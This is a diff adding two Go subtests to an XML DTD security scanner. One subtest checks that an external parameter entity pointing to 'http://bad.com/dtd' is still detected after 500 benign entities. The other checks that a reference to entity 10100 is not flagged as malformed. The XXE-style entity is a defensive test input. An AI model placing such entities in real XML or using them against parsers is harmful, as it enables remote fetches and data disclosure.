@@ -307,4 +307,41 @@ func TestXMLDTD_OverflowDeclarations(t *testing.T) {
 			}
 		}
 	})
+
+	t.Run("external parameter entity after 500 benign entities is detected", func(t *testing.T) {
+		var xmlData strings.Builder
+		xmlData.WriteString("<!DOCTYPE root [\n")
+		for i := 0; i < 500; i++ {
+			xmlData.WriteString(fmt.Sprintf("  <!ENTITY e%d \"value\">\n", i))
+		}
+		xmlData.WriteString("  <!ENTITY % pe SYSTEM \"http://bad.com/dtd\"> %pe;\n")
+		xmlData.WriteString("]><root/>")
+		
+		findings := scanXMLFile("test.xml", []byte(xmlData.String()))
+		foundPE := false
+		for _, f := range findings {
+			if f.RuleID == xmlExternalParamEntityRuleID {
+				foundPE = true
+			}
+		}
+		if !foundPE {
+			t.Errorf("expected %s for external param entity after cap", xmlExternalParamEntityRuleID)
+		}
+	})
+
+	t.Run("Entity beyond 10000 limit remains well-formed", func(t *testing.T) {
+		var xmlData strings.Builder
+		xmlData.WriteString("<!DOCTYPE root [\n")
+		for i := 0; i <= 10100; i++ {
+			xmlData.WriteString(fmt.Sprintf("  <!ENTITY e%d \"value\">\n", i))
+		}
+		xmlData.WriteString("]><root>&e10100;</root>")
+		
+		findings := scanXMLFile("test.xml", []byte(xmlData.String()))
+		for _, f := range findings {
+			if f.RuleID == xmlNotWellFormedRuleID {
+				t.Errorf("unexpected %s for entity 10100 ref", xmlNotWellFormedRuleID)
+			}
+		}
+	})
 }
